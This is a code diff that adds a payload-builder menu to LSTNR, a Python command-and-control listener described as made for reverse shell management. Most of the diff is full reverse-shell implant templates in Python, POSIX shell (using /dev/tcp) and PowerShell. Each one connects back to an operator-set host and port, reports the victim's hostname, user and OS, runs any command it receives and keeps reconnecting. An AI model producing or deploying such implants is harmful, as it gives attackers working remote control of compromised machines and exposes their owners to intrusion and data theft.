@@ -25,7 +25,7 @@ current_session = None
 in_session = False
 session_info = {}  # session_id -> (hostname, username)
 
-MAIN_COMMANDS = ["help", "list", "select", "die", "exit"]
+MAIN_COMMANDS = ["help", "list", "payload", "select", "die", "exit"]
 SESSION_COMMANDS = ["background", "die"]
 
 def main_menu_completer(text, state):
@@ -247,6 +247,398 @@ def print_sessions_table(session_map, addresses, session_info):
             print(row)
     print(border_bottom + RESET)
 
+## payload builder
+PAYLOAD_COMMANDS = ["set", "generate", "back", "options", "help"]
+payload_settings = {
+    "lhost": "127.0.0.1",
+    "lport": "4444",
+    "payload": "py"
+}
+
+def payload_completer(text, state):
+    options = []
+    if readline.get_line_buffer().strip().startswith("set"):
+        options = ["set lhost ", "set lport ", "set payload "]
+    else:
+        options = [cmd + " " for cmd in PAYLOAD_COMMANDS if cmd.startswith(text)]
+    return options[state] if state < len(options) else None
+
+def show_payload_options():
+    print("\nCurrent Payload Options:\n")
+    for key, value in payload_settings.items():
+        if value.strip() == "":
+            print(f"  {key.upper():10}: {RED}<NOT SET>{RESET}")
+        else:
+            print(f"  {key.upper():10}: {ORANGE}{value}{RESET}")
+    print("")
+
+
+def payload_help():
+    print(f"{ORANGE}\nPayload Menu Commands:{RESET}")
+    print(f"    set lhost <ip>      - Set the LSTNR IP address")
+    print(f"    set lport <port>    - Set the LSTNR listening port")
+    print(f"    set payload <type>  - Set payload type (EX: py, sh, ps1)")
+    print(f"    options             - Show current payload configuration")
+    print(f"    generate            - Generate the payload with current settings")
+    print(f"    back                - Return to the main menu")
+    print(f"    help                - Show this help menu\n")
+
+def payload_shell():
+    readline.set_completer(payload_completer)
+    readline.parse_and_bind("tab: complete")
+    while True:
+        try:
+            cmd = input(f"{RED}payload> {RESET}").strip()
+            if cmd == "":
+                continue
+            elif cmd.startswith("set"):
+                parts = cmd.split()
+                if len(parts) >= 3:
+                    key = parts[1].lower()
+                    value = " ".join(parts[2:])
+                    if key in payload_settings:
+                        payload_settings[key] = value
+                        print(f"[+] Set {key} to {value}")
+                    else:
+                        print(f"[-] Unknown setting: {key}")
+                else:
+                    print("Usage: set <lhost|lport|payload> <value>")
+            elif cmd == "generate":
+                generate_payload()
+            elif cmd == "back":
+                print("[*] Returning to main menu.")
+                readline.set_completer(main_menu_completer)
+                break
+            elif cmd == "options":
+                show_payload_options()
+            elif cmd == "help" or cmd == "?":
+                payload_help()
+            else:
+                print(f"Unknown command. Type {ORANGE}'help'{RESET} for payload options.")
+        except KeyboardInterrupt:
+            print("\n[*] Returning to main menu.")
+            readline.set_completer(main_menu_completer)
+            break
+        except Exception as e:
+            print(f"Error: {e}")
+
+def generate_payload():
+    lhost = payload_settings["lhost"]
+    lport = payload_settings["lport"]
+    payload_type = payload_settings["payload"]
+
+    if payload_type == "py":
+        payload_code = f'''import socket
+import subprocess
+import time
+import os
+import getpass
+
+SERVER_IP = "{lhost}"
+SERVER_PORT = {lport}
+
+def get_system_info():
+    try:
+        hostname = subprocess.check_output("hostname", shell=True).decode().strip()
+        username = getpass.getuser()
+        uname_output = subprocess.check_output("uname -a", shell=True).decode().strip()
+
+        parts = uname_output.split()
+        os_name = parts[1] if len(parts) > 1 else "Unknown"
+        version = parts[2].split("-")[0] if len(parts) > 2 else "Unknown"
+        arch = parts[-2] if len(parts) > 2 else "Unknown"
+
+        os_info = f"{{os_name}},{{version}},{{arch}}"
+        return hostname, username, os_info
+    except Exception:
+        return "Unknown", "Unknown", "Unknown,Unknown,Unknown"
+
+def connect():
+    while True:
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.connect((SERVER_IP, SERVER_PORT))
+
+            hostname, username, os_info = get_system_info()
+            sock.send(f"{{hostname}},{{username}},{{os_info}}".encode())
+
+            should_continue = shell(sock)
+            sock.close()
+            if not should_continue:
+                break
+        except Exception:
+            time.sleep(5)
+
+def shell(sock):
+    current_directory = os.getcwd()
+
+    while True:
+        try:
+            command = sock.recv(4096).decode().strip()
+            if not command:
+                break
+
+            if command.startswith("cd "):
+                path = command[3:].strip()
+                try:
+                    if os.path.isabs(path):
+                        os.chdir(path)
+                    else:
+                        os.chdir(os.path.join(os.getcwd(), path))
+                    current_directory = os.getcwd()
+                except FileNotFoundError:
+                    sock.send(f"Error: No such directory: {{path}}\\n".encode())
+                except Exception as e:
+                    sock.send(f"Error: {{str(e)}}\\n".encode())
+                try:
+                    sock.send(b"__END__")
+                except:
+                    pass
+                continue
+
+            if command == "die":
+                return False
+
+            proc = subprocess.Popen(
+                command,
+                shell=True,
+                executable="/bin/bash",
+                stdout=subprocess.PIPE,
+                stderr=subprocess.STDOUT,
+                text=True
+            )
+
+            output = ""
+            for line in proc.stdout:
+                output += line
+
+            if output:
+                try:
+                    sock.send(output.encode())
+                except:
+                    break
+
+            try:
+                sock.send(b"__END__")
+            except:
+                pass
+
+        except Exception as e:
+            try:
+                sock.send(f"Error: {{e}}\\n".encode())
+                sock.send(b"__END__")
+            except:
+                pass
+            break
+
+    return True
+
+if __name__ == "__main__":
+    connect()
+'''
+        filename = f"{lhost.replace('.', '_')}_{lport}.py"
+        with open(filename, "w") as f:
+            f.write(payload_code)
+        print(f"[+] Payload generated and saved as {ORANGE}{filename}{RESET}")
+    elif payload_type == "sh":
+        payload_code = f"""#!/bin/sh
+
+SERVER_IP="{payload_settings['lhost']}"
+SERVER_PORT={payload_settings['lport']}
+
+get_system_info() {{
+    HOSTNAME="$(hostname)"
+    USERNAME="$(whoami)"
+    UNAME_OUT="$(uname -a)"
+
+    OS_NAME="$(echo "$UNAME_OUT" | awk '{{print $2}}')"
+    VERSION="$(echo "$UNAME_OUT" | awk '{{print $3}}' | cut -d- -f1)"
+    ARCH="$(echo "$UNAME_OUT" | awk '{{print $(NF-1)}}')"
+
+    echo "$HOSTNAME,$USERNAME,$OS_NAME,$VERSION,$ARCH"
+}}
+
+connect() {{
+    while true; do
+        exec 3<>/dev/tcp/"$SERVER_IP"/"$SERVER_PORT" 2>/dev/null
+        if [ $? -eq 0 ]; then
+            SYSTEM_INFO="$(get_system_info)"
+            echo "$SYSTEM_INFO" >&3
+            shell_loop 3
+            exec 3<&- 3>&-
+        fi
+        sleep 5
+    done
+}}
+
+shell_loop() {{
+    SOCKET=$1
+    while true; do
+        if ! read -r CMD <&$SOCKET; then
+            break
+        fi
+
+        [ -z "$CMD" ] && break
+
+        if echo "$CMD" | grep -q "^cd "; then
+            DIR="$(echo "$CMD" | cut -d' ' -f2-)"
+            if cd "$DIR" 2>/dev/null; then
+                :
+            else
+                echo "Error: No such directory: $DIR" >&$SOCKET
+            fi
+            echo "__END__" >&$SOCKET
+            continue
+        fi
+
+        if [ "$CMD" = "die" ]; then
+            exit 0
+        fi
+
+        OUTPUT="$(sh -c "$CMD" 2>&1)"
+        if [ -n "$OUTPUT" ]; then
+            echo "$OUTPUT" >&$SOCKET
+        fi
+        echo "__END__" >&$SOCKET
+    done
+}}
+
+connect
+"""
+        filename = f"{lhost.replace('.', '_')}_{lport}.sh"
+        with open(filename, "w") as f:
+            f.write(payload_code)
+        print(f"[+] Payload generated and saved as {ORANGE}{filename}{RESET}")
+    elif payload_type == "ps1":
+        payload_code = f"""$ServerIP = "{payload_settings['lhost']}"
+$ServerPort = {payload_settings['lport']}
+
+function Get-SystemInfo {{
+    try {{
+        $hostname = [System.Net.Dns]::GetHostName()
+        $username = [Environment]::UserName
+        $os = Get-CimInstance -ClassName Win32_OperatingSystem
+        $osName = $os.Caption -replace "Microsoft ", ""
+        $version = $os.Version
+        $architecture = $os.OSArchitecture
+
+        return "$hostname,$username,$osName,$version,$architecture"
+    }} catch {{
+        return "Unknown,Unknown,Unknown,Unknown,Unknown"
+    }}
+}}
+
+function Connect-Server {{
+    while ($true) {{
+        try {{
+            $client = New-Object System.Net.Sockets.TcpClient
+            $client.Connect($ServerIP, $ServerPort)
+            $stream = $client.GetStream()
+            $writer = New-Object System.IO.StreamWriter($stream)
+            $reader = New-Object System.IO.StreamReader($stream)
+
+            $sysinfo = Get-SystemInfo
+            $writer.WriteLine($sysinfo)
+            $writer.Flush()
+
+            $shouldContinue = Invoke-Shell -Stream $stream -Reader $reader -Writer $writer
+            $client.Close()
+
+            if (-not $shouldContinue) {{
+                break
+            }}
+        }} catch {{
+            Start-Sleep -Seconds 5
+        }}
+    }}
+}}
+
+function Invoke-Shell {{
+    param(
+        [Parameter(Mandatory=$true)] [System.Net.Sockets.NetworkStream] $Stream,
+        [Parameter(Mandatory=$true)] [System.IO.StreamReader] $Reader,
+        [Parameter(Mandatory=$true)] [System.IO.StreamWriter] $Writer
+    )
+
+    $currentDirectory = Get-Location
+
+    while ($true) {{
+        try {{
+            $command = $Reader.ReadLine()
+            if ([string]::IsNullOrWhiteSpace($command)) {{
+                break
+            }}
+
+            if ($command.StartsWith("cd ")) {{
+                $path = $command.Substring(3).Trim()
+                try {{
+                    Set-Location -Path $path -ErrorAction Stop
+                    $currentDirectory = Get-Location
+                }} catch {{
+                    $Writer.WriteLine("Error: No such directory: $path")
+                }}
+                try {{
+                    $Writer.WriteLine("__END__")
+                    $Writer.Flush()
+                }} catch {{}}
+                continue
+            }}
+
+            if ($command -eq "die") {{
+                return $false
+            }}
+
+            try {{
+                $output = & {{
+                    $result = Invoke-Expression $command 2>&1
+                    $result | Out-String
+                }}
+            }} catch {{
+                $output = "Error executing command: $_"
+            }}
+
+            if ($output) {{
+                $lines = $output -split "`r?`n"
+                foreach ($line in $lines) {{
+                    try {{
+                        $Writer.WriteLine($line)
+                    }} catch {{
+                        break
+                    }}
+                }}
+                try {{
+                    $Writer.WriteLine("__END__")
+                    $Writer.Flush()
+                }} catch {{}}
+            }} else {{
+                try {{
+                    $Writer.WriteLine("__END__")
+                    $Writer.Flush()
+                }} catch {{}}
+            }}
+
+        }} catch {{
+            try {{
+                $Writer.WriteLine("Error: $_")
+                $Writer.WriteLine("__END__")
+                $Writer.Flush()
+            }} catch {{}}
+            break
+        }}
+    }}
+
+    return $true
+}}
+
+Connect-Server
+"""
+        filename = f"{lhost.replace('.', '_')}_{lport}.ps1"
+        with open(filename, "w") as f:
+            f.write(payload_code)
+        print(f"[+] Payload generated and saved as {ORANGE}{filename}{RESET}")
+    else:
+        print(f"[-] Payload type '{payload_type}' not implemented yet.")
+
 def menu_shell():
     global current_session
     readline.set_completer(main_menu_completer)
@@ -259,14 +651,23 @@ def menu_shell():
             elif cmd == "help" or cmd == "?":
                 print(f"""
 {ORANGE}Menu commands:{RESET}
-    list          - List sessions
-    select <id>   - Connect to a session by its ID
-    die           - Terminate all sessions
-    exit          - Terminate all sessions and exit LSTNR
+    list                - List sessions
+    select <id>         - Connect to a session by its ID
+    payload             - Payload generation menu
+    die                 - Terminate all sessions
+    exit                - Terminate all sessions and exit LSTNR
 {ORANGE}Session commands:{RESET}
-    <any command> - Execute command on client
-    background    - Return to main menu
-    die           - Terminate current session
+    <any command>       - Execute command on client
+    background          - Return to main menu
+    die                 - Terminate current session
+{ORANGE}Payload Menu Commands:{RESET}
+    set lhost <ip>      - Set the LSTNR IP address
+    set lport <port>    - Set the LSTNR listening port
+    set payload <type>  - Set payload type (EX: py, sh, ps1)
+    options             - Show current payload configuration
+    generate            - Generate the payload with current settings
+    back                - Return to the main menu
+    help                - Show this help menu
                 """)
             elif cmd == "list" or cmd == "ls":
                 print_sessions_table(session_map, addresses, session_info)
@@ -290,6 +691,8 @@ def menu_shell():
                 send_die_to_all()
                 print(f"[*] Exiting {BLUE}LSTNR{RESET}.")
                 break
+            elif cmd == "payload":
+                payload_shell()
             else:
                 print(f"Unknown command. Type {ORANGE}'help'{RESET} for options.")
         except KeyboardInterrupt:
@@ -316,7 +719,7 @@ def main():
 ██║     ╚════██║   ██║   ██║╚██╗██║██╔══██╗
 ███████╗███████║   ██║   ██║ ╚████║██║  ██║
 ╚══════╝╚══════╝   ╚═╝   ╚═╝  ╚═══╝╚═╝  ╚═╝
-    Remote Command & Control - v0.7
+    Remote Command & Control - v0.8
     - MADE FOR REVERSE SHELL MANAGEMENT{RESET}
         """)
         print(f"[+] Listening on {ORANGE}0.0.0.0:{args.port}{RESET}")
